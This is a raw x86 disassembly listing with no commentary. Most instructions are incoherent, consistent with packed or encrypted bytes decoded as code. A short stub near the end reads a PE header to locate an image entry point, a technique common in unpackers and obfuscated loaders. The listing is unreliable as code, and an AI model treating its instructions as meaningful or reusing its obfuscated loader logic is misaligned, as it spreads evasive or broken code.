  417fea:	mul    BYTE PTR [edi]
  417fec:	aad    0x4f
  417fee:	xchg   DWORD PTR [esi-0x14fb77ad],ecx
  417ff4:	push   esp
  417ff5:	add    eax,0x6d5f3f88
  417ffa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ffb:	iret   
  417ffc:	popa   
  417ffd:	pop    ss
  417ffe:	(bad)  
  417fff:	push   0xb5a84230
  418004:	ret    
  418005:	push   esp
  418006:	dec    ecx
  418007:	sub    dh,BYTE PTR [edx]
  418009:	inc    ebx
  41800a:	adc    DWORD PTR [ecx-0x6558467d],eax
  418010:	in     eax,dx
  418011:	jl     0x417fe3
  418013:	and    DWORD PTR [ecx+0x29c027dd],edi
  418019:	div    ebx
  41801b:	and    cl,BYTE PTR [ebp+0x60]
  41801e:	es jns 0x417fd8
  418021:	outs   dx,DWORD PTR ds:[esi]
  418022:	adc    al,0xa2
  418024:	mov    DWORD PTR [esi],ecx
  418026:	pop    edx
  418027:	mov    dh,0xb4
  418029:	mov    eax,ebp
  41802b:	ins    DWORD PTR es:[edi],dx
  41802c:	xchg   esp,eax
  41802d:	fidiv  WORD PTR [ebx+esi*8+0x3f27f68e]
  418034:	xor    BYTE PTR [ecx+0x60],dh
  418037:	in     eax,dx
  418038:	retf   
  418039:	add    BYTE PTR ds:0x9d3e12b2,ah
  41803f:	xor    BYTE PTR [esi-0x6739df7a],0x5c
  418046:	pop    ecx
  418047:	push   ds
  418048:	dec    edi
  418049:	push   ds
  41804a:	mov    cl,0x5b
  41804c:	lods   eax,DWORD PTR ds:[esi]
  41804d:	mov    edi,0x23e95b51
  418052:	jle    0x4180d1
  418054:	xchg   edx,eax
  418055:	xchg   ebp,eax
  418056:	mov    ebx,0xf75c9955
  41805b:	fwait
  41805c:	repz jno 0x418082
  41805f:	mov    esp,0x417f0e61
  418064:	and    al,0xe1
  418066:	xchg   esp,eax
  418067:	test   eax,0x2259492a
  41806c:	clc    
  41806d:	loopne 0x418031
  41806f:	mul    DWORD PTR [ebx+ecx*4]
  418072:	sar    bl,1
  418074:	mov    bh,al
  418076:	pop    ebp
  418077:	push   ecx
  418078:	jmp    0x185a:0xae27a63c
  41807f:	dec    esp
  418080:	push   ss
  418081:	mov    eax,0xc08200e7
  418086:	mov    esi,0xc016e4cf
  41808b:	push   cs
  41808c:	adc    ebx,DWORD PTR [ebp-0x20]
  41808f:	ins    BYTE PTR es:[edi],dx
  418090:	pop    edx
  418091:	out    dx,eax
  418092:	add    eax,0x37df5b5f
  418097:	pop    eax
  418098:	push   cs
  418099:	mov    WORD PTR [ecx],es
  41809b:	push   edi
  41809c:	repz popf 
  41809e:	sub    edi,DWORD PTR [edi+0x74]
  4180a1:	scas   eax,DWORD PTR es:[edi]
  4180a2:	fs (bad) 
  4180a4:	push   ebx
  4180a5:	jae    0x4180da
  4180a7:	cmp    al,0xf0
  4180a9:	adc    ch,BYTE PTR [esi-0x12]
  4180ac:	stos   DWORD PTR es:[edi],eax
  4180ad:	sbb    al,0x71
  4180af:	in     al,0xf7
  4180b1:	xchg   esp,eax
  4180b2:	lods   al,BYTE PTR ds:[esi]
  4180b3:	adc    DWORD PTR [esi+0xf],esp
  4180b6:	fsub   QWORD PTR [edx]
  4180b8:	mov    esi,0xad467094
  4180bd:	push   edx
  4180be:	sub    BYTE PTR [ebp-0x56],0xd0
  4180c2:	lea    ebx,[eax-0x733945d8]
  4180c8:	cli    
  4180c9:	lea    edx,[eax+0x62]
  4180cc:	loop   0x41808e
  4180ce:	push   cs
  4180cf:	scas   al,BYTE PTR es:[edi]
  4180d0:	sub    BYTE PTR [ebp-0x36],dh
  4180d3:	jo     0x4180dd
  4180d5:	xchg   ebp,esi
  4180d7:	pop    ebp
  4180d8:	sub    ah,dl
  4180da:	push   ds
  4180db:	iret   
  4180dc:	sbb    DWORD PTR [esp+ecx*2-0x62],ebx
  4180e0:	addr16 xchg ebp,eax
  4180e2:	and    al,0xb2
  4180e4:	cli    
  4180e5:	jge    0x418125
  4180e7:	outs   dx,DWORD PTR ds:[esi]
  4180e8:	jp     0x4180a9
  4180ea:	mov    bl,0x49
  4180ec:	fstp   QWORD PTR [eax-0x19d6e8aa]
  4180f2:	or     esp,ecx
  4180f4:	dec    eax
  4180f5:	sar    DWORD PTR [eax],1
  4180f7:	out    0xc4,al
  4180f9:	and    dl,BYTE PTR [edx+ecx*4-0x52]
  4180fd:	mov    es,edx
  4180ff:	pop    es
  418100:	into   
  418101:	jge    0x4180c6
  418103:	add    ebp,ebp
  418105:	(bad)  
  418106:	mov    cl,0x16
  418108:	xor    eax,0x74a68f37
  41810d:	jle    0x4180a4
  41810f:	mov    esp,0x71e7c500
  418114:	and    eax,0x68a260dc
  418119:	pop    esp
  41811a:	fisttp DWORD PTR [edi-0x290cfbc0]
  418120:	jge    0x418188
  418122:	data16 or dh,cl
  418125:	or     BYTE PTR [ecx],0x11
  418128:	and    ah,cl
  41812a:	pop    edx
  41812b:	test   eax,0x5b808617
  418130:	dec    ecx
  418131:	inc    edx
  418132:	add    dl,dl
  418134:	es push cs
  418136:	test   BYTE PTR [esi-0x4d7d98e6],dh
  41813c:	mov    esi,0xba2ca837
  418141:	gs pop edx
  418143:	jno    0x4180e6
  418145:	adc    eax,0xfcef526d
  41814a:	sahf   
  41814b:	dec    edi
  41814c:	cmc    
  41814d:	adc    ecx,DWORD PTR [edx+0x21]
  418150:	dec    esp
  418151:	rcl    BYTE PTR [edx+0x5bf97bcf],0x99
  418158:	pop    ebp
  418159:	call   0x6f59702f
  41815e:	(bad)  [edx+ebp*4]
  418161:	std    
  418162:	push   ebp
  418163:	sbb    DWORD PTR [ebx+0x55438b8f],ebp
  418169:	inc    ebx
  41816a:	inc    ebx
  41816b:	int    0xb
  41816d:	adc    eax,0x3c347209
  418172:	mov    esi,0xedb044c1
  418177:	add    al,0xdd
  418179:	xlat   BYTE PTR ds:[ebx]
  41817a:	xor    bh,al
  41817c:	xchg   ebx,eax
  41817d:	retf   
  41817e:	fst    QWORD PTR [ebx-0x140c64ed]
  418184:	cwde   
  418185:	aas    
  418186:	add    al,0x64
  418188:	and    ah,bh
  41818a:	jne    0x41816c
  41818c:	jne    0x4181b7
  41818e:	inc    eax
  41818f:	or     bl,bh
  418191:	dec    eax
  418192:	ja     0x41817f
  418194:	outs   dx,DWORD PTR ds:[esi]
  418195:	scas   al,BYTE PTR es:[edi]
  418196:	mov    esi,DWORD PTR [ebp+0xc]
  418199:	xor    ecx,eax
  41819b:	xor    esi,eax
  41819d:	lea    ecx,[esi+ecx*1+0x327298]
  4181a4:	xor    ecx,eax
  4181a6:	jmp    0x4184c0
  4181ab:	sar    BYTE PTR [esi],0xce
  4181ae:	xlat   BYTE PTR ds:[ebx]
  4181af:	(bad)  
  4181b0:	xlat   BYTE PTR ds:[ebx]
  4181b1:	(bad)
  4181b4:	loope  0x41818c
  4181b6:	pop    esp
  4181b7:	jno    0x41819d
  4181b9:	xchg   DWORD PTR [edi+0x19],edx
  4181bc:	xor    al,0x7f
  4181be:	js     0x41823b
  4181c0:	jle    0x41823a
  4181c2:	js     0x41822d
  4181c4:	mov    ds:0x881dbb7d,al
  4181c9:	hlt    
  4181ca:	pop    edi
  4181cb:	sahf   
  4181cc:	clc    
  4181cd:	sbb    eax,0x5e620ef4
  4181d2:	loope  0x4181f8
  4181d4:	test   al,0xa0
  4181d6:	or     DWORD PTR [edx+eiz*1],ecx
  4181d9:	sub    eax,0xf9c9df3e
  4181de:	sbb    eax,0x819185c9
  4181e3:	push   0x1e
  4181e5:	sub    bl,BYTE PTR [esi+0x23eeae2]
  4181eb:	mov    esi,0x5ef0c4d9
  4181f0:	push   0x34ac4069
  4181f5:	stos   DWORD PTR es:[edi],eax
  4181f6:	(bad)  
  4181f8:	call   0xff7c:0xd056368a
  4181ff:	bound  ecx,QWORD PTR [esi+0x64]
  418202:	jmp    0xd41e8424
  418207:	xchg   ebp,eax
  418208:	out    0xc3,al
  41820a:	cli    
  41820b:	or     al,0xd4
  41820d:	or     eax,0x8345bb44
  418212:	jae    0x41822d
  418214:	adc    DWORD PTR ds:0x3eb00521,0xff580929
  41821e:	mov    cl,0x6f
  418220:	jp     0x4181a2
  418222:	in     eax,dx
  418223:	sti    
  418224:	sub    al,BYTE PTR [eax+edx*4]
  418227:	gs cmp eax,0x9daa030c
  41822e:	push   esi
  41822f:	fnstsw WORD PTR ds:0xaa177247
  418235:	rcr    BYTE PTR [ebp+0x36],cl
  418238:	jp     0x4181eb
  41823a:	pop    es
  41823b:	pop    esi
  41823c:	mov    bl,0x1b
  41823e:	imul   edx,DWORD PTR [ebx-0x3558f226],0x1b
  418245:	test   DWORD PTR [ebx],ebx
  418247:	inc    esp
  418248:	addr16 jmp 0x418279
  41824b:	das    
  41824c:	xchg   ebp,eax
  41824d:	ds sub eax,0x234a68d3
  418253:	fwait
  418254:	xchg   BYTE PTR ds:0x28e46d82,bh
  41825a:	mov    bh,0x6c
  41825c:	xchg   ecx,eax
  41825d:	aam    0x54
  41825f:	ins    BYTE PTR es:[edi],dx
  418260:	and    ch,dl
  418262:	cmp    DWORD PTR [edi+0x6e3e4d49],0xe20166c
  41826c:	ret    0x9d3
  41826f:	shl    BYTE PTR [edx+0x5e9e38f7],cl
  418275:	inc    ebp
  418276:	test   dl,bh
  418278:	xor    eax,0x4f8bbfbc
  41827d:	dec    ecx
  41827e:	cmp    ah,bh
  418280:	enter  0x4c3d,0xda
  418284:	leave  
  418285:	dec    edx
  418286:	add    BYTE PTR [esi-0x7e],0xda
  41828a:	pop    ebx
  41828b:	call   0x355e:0x49787da2
  418292:	sbb    al,0xe
  418294:	mov    ah,0xd3
  418296:	add    DWORD PTR [edi-0x5d80516],esp
  41829c:	xchg   edx,eax
  41829d:	cwde   
  41829e:	ins    DWORD PTR es:[edi],dx
  41829f:	shl    DWORD PTR [eax-0x72bc3bbb],0x52
  4182a6:	outs   dx,BYTE PTR ds:[esi]
  4182a7:	dec    edx
  4182a8:	dec    edx
  4182a9:	cmp    eax,0x434afae5
  4182ae:	imul   esp,DWORD PTR ds:0x61fb,0x43c5d33e
  4182b7:	jo     0x418338
  4182b9:	lods   eax,DWORD PTR ds:[esi]
  4182ba:	jecxz  0x41824f
  4182bc:	adc    ah,al
  4182be:	push   edi
  4182bf:	call   0x7ca2c16f
  4182c4:	ins    BYTE PTR es:[edi],dx
  4182c5:	int3   
  4182c6:	in     al,dx
  4182c7:	or     cl,BYTE PTR cs:[esi+0x54]
  4182cb:	setle  BYTE PTR [ecx+0xdeca3db]
  4182d2:	fdivr  QWORD PTR [eax-0x7614290d]
  4182d8:	bnd jae 0x418354
  4182db:	ins    BYTE PTR es:[edi],dx
  4182dc:	and    eax,0x87dffff6
  4182e1:	sar    BYTE PTR [ebp-0x23],1
  4182e4:	mov    edx,0x75f9d382
  4182e9:	retf   
  4182ea:	adc    BYTE PTR [eax-0x7a],0xd5
  4182ee:	push   es
  4182ef:	(bad)  
  4182f0:	es or  al,0xa6
  4182f3:	sbb    DWORD PTR [edx+0x20],ebx
  4182f6:	enter  0x6a55,0xdd
  4182fa:	or     DWORD PTR [edi+esi*1],esp
  4182fd:	jne    0x418320
  4182ff:	ret    0x6f72
  418302:	ret    0x1a93
  418305:	adc    bh,BYTE PTR [esi-0x30]
  418308:	add    BYTE PTR [eax+0x61],ch
  41830b:	in     eax,0x40
  41830d:	cmp    DWORD PTR [edx+ebp*2],edi
  418310:	jo     0x418310
  418312:	stos   DWORD PTR es:[edi],eax
  418313:	and    DWORD PTR fs:[esi+0x7648fe6f],esp
  41831a:	test   BYTE PTR [edi-0x8],dh
  41831d:	xchg   DWORD PTR [edx-0x22],edi
  418320:	rol    al,cl
  418322:	sbb    dh,dh
  418324:	or     BYTE PTR [edx],dl
  418326:	cmp    DWORD PTR [eax+0x3d37c56d],ebx
  41832c:	in     eax,0x20
  41832e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41832f:	pop    ebp
  418330:	lods   eax,DWORD PTR ds:[esi]
  418331:	dec    eax
  418332:	shl    DWORD PTR [ebx-0x4540a3a8],1
  418338:	jae    0x4183aa
  41833a:	jle    0x41833e
  41833c:	vpminsw ymm1,ymm4,YMMWORD PTR [bp+di-0x7bcb]
  418343:	mov    esp,0xefd79aba
  418348:	ins    DWORD PTR es:[edi],dx
  418349:	dec    esp
  41834a:	test   dl,0xc5
  41834d:	xor    eax,0xfa27adc7
  418352:	dec    esp
  418353:	push   0xfffffff8
  418355:	jbe    0x4183c3
  418357:	pop    edi
  418358:	xor    ah,ch
  41835a:	ja     0x4182dd
  41835c:	fisttp DWORD PTR [ecx-0x65027669]
  418362:	dec    eax
  418363:	nop
  418364:	retf   0xc074
  418367:	cmp    ebx,DWORD PTR [eax-0x32]
  41836a:	outs   dx,DWORD PTR ds:[esi]
  41836b:	dec    ebx
  41836c:	pop    ecx
  41836d:	or     DWORD PTR [ecx-0x45ef7d45],edi
  418373:	inc    ebp
  418374:	jge    0x4183a3
  418376:	int3   
  418377:	scas   al,BYTE PTR es:[edi]
  418378:	push   0x21
  41837a:	loope  0x418352
  41837c:	sub    eax,0x215230f1
  418381:	das    
  418382:	hlt    
  418383:	popf   
  418384:	inc    ebx
  418385:	data16 shr BYTE PTR [ecx],0x84
  418389:	lock push 0x7a
  41838c:	out    0x44,al
  41838e:	mov    eax,0xfd247d16
  418393:	adc    al,0x7c
  418395:	test   eax,0x3413c933
  41839a:	sbb    BYTE PTR [esi+0x6a],ch
  41839d:	cld    
  41839e:	cs dec eax
  4183a0:	pop    esp
  4183a1:	stc    
  4183a2:	cwde   
  4183a3:	mov    ebp,DWORD PTR [ebx+edx*1]
  4183a6:	cmp    BYTE PTR [ebp+0x13],dh
  4183a9:	mov    esi,0x253e501e
  4183ae:	and    esp,DWORD PTR [edx]
  4183b0:	gs xchg esi,eax
  4183b2:	lea    esi,[ebp-0x3b6f7b97]
  4183b8:	jmp    0x4183e2
  4183ba:	int    0x75
  4183bc:	ret    0xdcfa
  4183bf:	jb     0x418388
  4183c1:	stos   BYTE PTR es:[edi],al
  4183c2:	frstor [edi-0x52973fe9]
  4183c8:	jmp    0xdb3b:0x65480e0d
  4183cf:	ror    BYTE PTR [ebp+0x3366b016],cl
  4183d5:	call   0x6ced:0xa472a7e3
  4183dc:	inc    esi
  4183dd:	icebp  
  4183de:	rcl    DWORD PTR ds:0x4a3bfaf7,cl
  4183e4:	pusha  
  4183e5:	test   eax,0xca89b69a
  4183ea:	inc    edx
  4183eb:	sar    BYTE PTR [ecx-0x521f9fa],0xce
  4183f2:	test   eax,0x823cf8e3
  4183f7:	lea    eax,[edx-0x3a]
  4183fa:	leave  
  4183fb:	push   ebp
  4183fc:	adc    DWORD PTR [ebx+0x59],edi
  4183ff:	xchg   ebp,eax
  418400:	loope  0x4183c1
  418402:	dec    eax
  418403:	sbb    ecx,esi
  418405:	jb     0x924b8a25
  41840b:	gs stos DWORD PTR es:[edi],eax
  41840d:	fs pop ebx
  41840f:	iret   
  418410:	int    0x7c
  418412:	xchg   ecx,eax
  418413:	xor    eax,0xe29dcbb2
  418418:	or     DWORD PTR [ebp-0x24],edi
  41841b:	adc    ebx,DWORD PTR [edx-0x524e5447]
  418421:	sub    bl,BYTE PTR [edi+0x568f1426]
  418427:	pop    ss
  418428:	dec    edi
  418429:	mov    bl,BYTE PTR [esi+0x46dd80e9]
  41842f:	(bad)  
  418430:	mov    eax,DWORD PTR [ecx]
  418432:	pop    es
  418433:	jnp    0x41847d
  418435:	int3   
  418436:	mov    esp,0xaa1b56bf
  41843b:	cdq    
  41843c:	push   0xffffffc3
  41843e:	cmp    ah,BYTE PTR [edx+0x41]
  418441:	ins    DWORD PTR es:[edi],dx
  418442:	mov    ch,0xe4
  418444:	and    BYTE PTR [ebx+0x14],ch
  418447:	popa   
  418448:	dec    edx
  418449:	push   ecx
  41844a:	int3   
  41844b:	leave  
  41844c:	fnsave [ecx]
  41844e:	retf   
  41844f:	out    dx,eax
  418450:	into   
  418451:	adc    al,0x8c
  418453:	xor    DWORD PTR [ebp-0x32],0x7ef40892
  41845a:	call   0x787f:0x5c5ff63e
  418461:	mov    edx,0x9e257782
  418466:	cli    
  418467:	pop    es
  418468:	or     DWORD PTR [edx],esi
  41846a:	imul   BYTE PTR [esp+esi*8]
  41846d:	sub    ebp,DWORD PTR [ecx+0x5b2fad2b]
  418473:	cs jno 0x4184aa
  418476:	pop    esi
  418477:	mov    cl,0x51
  418479:	add    eax,0xe5e0b35
  41847e:	push   ds
  41847f:	or     DWORD PTR [esi-0x3ab83c3e],ebp
  418485:	xchg   DWORD PTR [edx],ecx
  418487:	lods   al,BYTE PTR ds:[esi]
  418488:	or     eax,0xe4b78a47
  41848d:	inc    esi
  41848e:	sub    edi,DWORD PTR ds:[edx+ebx*8]
  418492:	addr16 daa 
  418494:	lods   al,BYTE PTR ds:[esi]
  418495:	out    dx,eax
  418496:	adc    eax,0xf3f649a4
  41849b:	lock inc edx
  41849d:	cmp    al,0x84
  41849f:	jmp    0x4184c8
  4184a1:	adc    DWORD PTR [esi-0x69],0xffffffb1
  4184a5:	and    bl,BYTE PTR [esi-0x29]
  4184a8:	and    al,BYTE PTR es:[ebp+0x74c244e9]
  4184af:	cmp    BYTE PTR [edi-0x478faf69],dh
  4184b5:	jno    0x41845b
  4184b7:	dec    ebx
  4184b8:	push   ss
  4184b9:	aas    
  4184ba:	pushf  
  4184bb:	mov    esi,0x1dadd4ba
  4184c0:	cmp    ecx,0xf89c8528
  4184c6:	jne    0x417e12
  4184cc:	jmp    0x418819
  4184d1:	jmp    0x4187eb
  4184d6:	int3   
  4184d7:	les    edi,FWORD PTR [edi+ecx*8]
  4184da:	aam    0xd7
  4184dc:	ror    ebx,cl
  4184de:	mov    esi,0x64ec6d48
  4184e3:	mov    esi,0x3914f135
  4184e8:	jg     0x418562
  4184ea:	jnp    0x41856a
  4184ec:	js     0x418566
  4184ee:	and    bl,ah
  4184f0:	das    
  4184f1:	sar    DWORD PTR [ebx-0x7b9c473e],1
  4184f7:	adc    cl,BYTE PTR [esi+0x72]
  4184fa:	and    ch,0xf4
  4184fd:	push   ebp
  4184fe:	xor    al,0x84
  418500:	push   DWORD PTR [ebx-0x73b649e3]
  418506:	repz xchg esi,eax
  418508:	or     DWORD PTR [ebp+0x60caee46],edx
  41850e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41850f:	out    dx,eax
  418510:	mov    eax,0xfc06dd17
  418515:	jae    0x41852c
  418517:	mov    ecx,0xe054adbf
  41851c:	add    edx,ebp
  41851e:	mov    al,0xfa
  418520:	repz (bad) 
  418523:	(bad)  
  418524:	ja     0x418547
  418526:	jl     0x41855a
  418528:	or     al,0x4e
  41852a:	imul   eax,DWORD PTR [esi+0x27b76440],0xffffffc5
  418531:	mov    eax,0x92b7761
  418536:	lock xor DWORD PTR [edx],ebx
  418539:	(bad)  
  41853a:	xchg   BYTE PTR [ebx+ecx*1+0x40],bl
  41853e:	mov    bx,0x5969
  418542:	sub    eax,0xf3ef7032
  418547:	imul   esi,DWORD PTR [ecx-0x1e],0xffffffb4
  41854b:	sub    BYTE PTR [ebx-0x1a],al
  41854e:	popa   
  41854f:	out    dx,eax
  418550:	pop    esp
  418551:	jb     0x4185af
  418553:	pop    es
  418554:	mov    ecx,0x5207c88f
  418559:	dec    ebp
  41855a:	in     eax,0xff
  41855c:	add    BYTE PTR [esi-0x6c89e420],ah
  418562:	pop    ebp
  418563:	rcr    DWORD PTR [edi+0x5c7480b6],1
  418569:	into   
  41856a:	or     al,0xb5
  41856c:	jne    0x4185de
  41856e:	mov    ch,0xd2
  418570:	sbb    eax,0xdcdbe038
  418575:	and    edx,edi
  418577:	loopne 0x418506
  418579:	aad    0xcf
  41857b:	(bad)  
  41857c:	lea    edx,[edi+0x45064b2f]
  418582:	xchg   esi,eax
  418583:	call   0xcf53:0xb2d17b2
  41858a:	rol    BYTE PTR [ebx-0x38892d00],0x3f
  418591:	pop    ebp
  418592:	enter  0x8a57,0xe6
  418596:	push   ss
  418597:	mov    esi,0xbcbfcca0
  41859c:	xchg   esp,eax
  41859d:	int    0x50
  41859f:	mov    cl,0x58
  4185a1:	sub    eax,0x1e8046a3
  4185a6:	jge    0x418560
  4185a8:	fsincos 
  4185aa:	in     al,0xb5
  4185ac:	pop    ebp
  4185ad:	hlt    
  4185ae:	cmp    eax,0xee250f95
  4185b3:	mov    bl,0x74
  4185b5:	sbb    bl,dl
  4185b7:	lea    ebx,[esi]
  4185b9:	or     ecx,edx
  4185bb:	mov    ds:0xc876f3b6,al
  4185c0:	pmulhw mm0,QWORD PTR [edi+0x68]
  4185c4:	imul   ecx,DWORD PTR [ebx+eiz*1+0x68],0x836148c1
  4185cc:	iret   
  4185cd:	jmp    0x351a:0x7062ff3
  4185d4:	mov    ch,BYTE PTR [ebp-0x597bdeef]
  4185da:	pop    esi
  4185db:	repnz pop edx
  4185dd:	inc    eax
  4185de:	repnz frstor [edx-0x61]
  4185e2:	popa   
  4185e3:	mov    ebx,0xef51e3ba
  4185e8:	stos   DWORD PTR es:[edi],eax
  4185e9:	mov    eax,DWORD PTR [esi+ebp*2]
  4185ec:	push   eax
  4185ed:	mov    esi,0xc1538237
  4185f2:	adc    dh,dl
  4185f4:	gs mov cl,0x2d
  4185f7:	dec    esi
  4185f8:	test   eax,0xa54d737a
  4185fd:	std    
  4185fe:	mov    ds:0x6ca2259,eax
  418603:	out    0x96,eax
  418605:	scas   eax,DWORD PTR es:[edi]
  418606:	jmp    0xc475:0x6b1e8b4d
  41860d:	test   eax,0xdc14c5cb
  418612:	outs   dx,BYTE PTR ds:[esi]
  418613:	mov    ecx,0x84836d4a
  418618:	mov    ecx,0xda03ae88
  41861d:	mov    al,0xaa
  41861f:	leave  
  418620:	arpl   WORD PTR [ecx+0x16],di
  418623:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418624:	(bad)
  418627:	jp     0x41864e
  418629:	cmovl  ebx,eax
  41862c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41862d:	scas   al,BYTE PTR es:[edi]
  41862e:	xchg   edi,eax
  41862f:	pop    ecx
  418630:	out    dx,al
  418631:	pusha  
  418632:	push   ebx
  418633:	test   DWORD PTR [ecx-0x2b],0x160d4b52
  41863a:	dec    edx
  41863b:	mov    dh,0xf3
  41863d:	lahf   
  41863e:	(bad)  
  41863f:	popf   
  418640:	or     eax,0x92aa85b8
  418645:	outs   dx,BYTE PTR ds:[esi]
  418646:	aas    
  418647:	retf   
  418648:	clc    
  418649:	add    BYTE PTR [ebp-0x5083ff8f],0x30
  418650:	(bad)  
  418651:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418652:	leave  
  418653:	sar    BYTE PTR [eax+0xf],0x62
  418657:	add    ecx,edi
  418659:	mov    eax,ds:0xd1215b4
  41865f:	outs   dx,DWORD PTR ds:[esi]
  418660:	cmp    cl,dh
  418662:	xor    al,0xb8
  418664:	sbb    al,BYTE PTR [edx+0x41]
  418667:	jnp    0x41868c
  418669:	shr    ah,cl
  41866b:	int3   
  41866c:	loope  0x418637
  41866e:	push   ebp
  41866f:	adc    eax,0x65bbcdf3
  418674:	stos   BYTE PTR es:[edi],al
  418675:	lods   al,BYTE PTR ds:[esi]
  418676:	sbb    ebp,DWORD PTR [ebx]
  418678:	jecxz  0x418665
  41867a:	inc    eax
  41867b:	xlat   BYTE PTR ds:[ebx]
  41867c:	(bad)
  418680:	mov    esi,DWORD PTR [esi+0x46]
  418683:	push   ebp
  418684:	or     esp,eax
  418686:	lock or BYTE PTR ds:[ebp+0x7e],bh
  41868b:	xchg   ebx,eax
  41868c:	and    ebx,esi
  41868e:	xchg   ebx,eax
  41868f:	push   edi
  418690:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418691:	std    
  418692:	sub    BYTE PTR [ebx+0x24d3f339],ah
  418698:	(bad)  
  418699:	icebp  
  41869a:	pop    ss
  41869b:	push   ds
  41869c:	mov    eax,0x58369131
  4186a1:	push   ebx
  4186a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186a3:	mov    bl,0x9a
  4186a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4186a6:	cmp    eax,0x5bec3b98
  4186ab:	mov    dh,0xda
  4186ad:	sti    
  4186ae:	dec    esi
  4186af:	mov    DWORD PTR [edx+0x4ca1586e],ebx
  4186b5:	popa   
  4186b6:	xor    eax,0x4308df54
  4186bb:	sbb    edx,DWORD PTR [ebx*2+0x4c8665eb]
  4186c2:	dec    edi
  4186c3:	push   edx
  4186c4:	and    BYTE PTR [esi-0x51],bl
  4186c7:	xchg   BYTE PTR [edi],dl
  4186c9:	mov    ebx,0x5e06e980
  4186ce:	fld    TBYTE PTR [ecx+0xb]
  4186d1:	push   eax
  4186d2:	xor    eax,0x132b362
  4186d7:	call   DWORD PTR [eax+0x58aa81d3]
  4186dd:	(bad)  
  4186de:	sub    al,0xa8
  4186e0:	mov    al,ds:0x178b0f23
  4186e5:	push   ebx
  4186e6:	mov    ecx,0xd143d20c
  4186eb:	mov    al,ds:0xbd39a3ca
  4186f0:	fldcw  WORD PTR [ecx-0x1e]
  4186f3:	arpl   si,bp
  4186f5:	jmp    0x418727
  4186f7:	mov    dh,0x22
  4186f9:	arpl   ax,bp
  4186fb:	scas   eax,DWORD PTR es:[edi]
  4186fc:	sub    al,BYTE PTR [eax-0x39]
  4186ff:	cmp    eax,0x874122bf
  418704:	add    ah,cl
  418706:	fcmove st,st(1)
  418708:	inc    edx
  418709:	enter  0x2089,0x87
  41870d:	outs   dx,DWORD PTR ds:[esi]
  41870e:	popa   
  41870f:	fnstsw WORD PTR [edi-0x2]
  418712:	out    dx,eax
  418713:	inc    edi
  418714:	and    DWORD PTR [esi+ecx*1],0x28
  418718:	les    ecx,FWORD PTR [edx-0x18]
  41871b:	and    cl,cl
  41871d:	mov    esp,0x41d0f9d2
  418722:	xchg   ebp,eax
  418723:	ss (bad) 
  418725:	lods   al,BYTE PTR ds:[esi]
  418726:	inc    edx
  418727:	es inc ebx
  418729:	call   FWORD PTR [eax+0x9308a6d]
  41872f:	aad    0xc6
  418731:	push   es
  418732:	sub    al,0xd0
  418734:	lar    esi,WORD PTR [esi+0x2fec4556]
  41873b:	inc    ebx
  41873c:	mov    eax,ds:0x630e5fae
  418741:	jns    0x41872e
  418743:	pop    esi
  418744:	aaa    
  418745:	add    DWORD PTR [esi+esi*2+0x35],eax
  418749:	adc    BYTE PTR [edx-0x4791f752],0x89
  418750:	shr    eax,cl
  418752:	aam    0xaa
  418754:	dec    ecx
  418755:	int    0x70
  418757:	leave  
  418758:	hlt    
  418759:	jne    0x4187cf
  41875b:	outs   dx,DWORD PTR ds:[esi]
  41875c:	push   esi
  41875d:	dec    ebx
  41875e:	mov    ch,0x54
  418760:	dec    ecx
  418761:	or     cl,bh
  418763:	(bad)  
  418764:	sahf   
  418765:	hlt    
  418766:	pop    ss
  418767:	ins    BYTE PTR es:[edi],dx
  418768:	outs   dx,BYTE PTR ds:[esi]
  418769:	retf   0xaf21
  41876c:	call   0xa6d:0xec3f0bfe
  418773:	sub    ecx,ebp
  418775:	sub    DWORD PTR [eax-0x7416f6ec],0xd50417f0
  41877f:	dec    edi
  418780:	and    al,0x92
  418782:	aaa    
  418783:	push   esi
  418784:	and    ebp,ecx
  418786:	mov    dl,0xab
  418788:	es adc eax,0x5a4b3529
  41878e:	ror    BYTE PTR [eax+0x32e699aa],cl
  418794:	cmp    esp,DWORD PTR [edx-0x27]
  418797:	xor    BYTE PTR [ecx*1-0x4fc04185],0xa3
  41879f:	or     bl,cl
  4187a1:	and    eax,0x797b5952
  4187a6:	push   ebp
  4187a7:	push   esi
  4187a8:	loop   0x418814
  4187aa:	inc    edi
  4187ab:	add    ebp,DWORD PTR [esi+0x54cc3812]
  4187b1:	push   esi
  4187b2:	cli    
  4187b3:	out    dx,eax
  4187b4:	cwde   
  4187b5:	and    al,0xeb
  4187b7:	add    al,0x68
  4187b9:	sub    eax,0x98e8681
  4187be:	icebp  
  4187bf:	lea    esi,[ebx-0x2e31337c]
  4187c5:	xchg   ebp,eax
  4187c6:	push   edx
  4187c7:	pop    eax
  4187c8:	arpl   WORD PTR [edi],bp
  4187ca:	addr16 sub ebx,ebx
  4187cd:	test   bl,ch
  4187cf:	mov    ch,0xe
  4187d1:	mov    edx,0x211d40e0
  4187d6:	mov    esp,0x76b4a788
  4187db:	mov    ebx,0x5b434351
  4187e0:	push   es
  4187e1:	and    DWORD PTR [ecx-0x77098600],esp
  4187e7:	mov    dh,0x50
  4187e9:	jmp    0x69030952
  4187ee:	(bad)  
  4187ef:	int    0xff
  4187f1:	mov    esi,ecx
  4187f3:	xor    esi,eax
  4187f5:	add    esi,DWORD PTR [ebp+0x8]
  4187f8:	mov    DWORD PTR [ebp+0x8],esi
  4187fb:	mov    esi,DWORD PTR [ebp+0x8]
  4187fe:	xor    esi,ecx
  418800:	xor    esi,eax
  418802:	mov    eax,DWORD PTR [edx+0x194]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	mov    eax,DWORD PTR [ecx+0x3c]
  41880d:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  418811:	add    eax,ecx
  418813:	mov    DWORD PTR [ebp+0x8],esi
  418816:	mov    DWORD PTR [ebp+0x10],eax
  418819:	mov    eax,DWORD PTR [ebp+0x10]
  41881c:	pop    esi
  41881d:	test   eax,eax
  41881f:	je     0x419191
  418825:	push   DWORD PTR ds:0x41ebbe
  41882b:	jmp    0x418b45
  418830:	cmp    eax,0xcbd3c4c6
  418835:	rcl    ebp,1
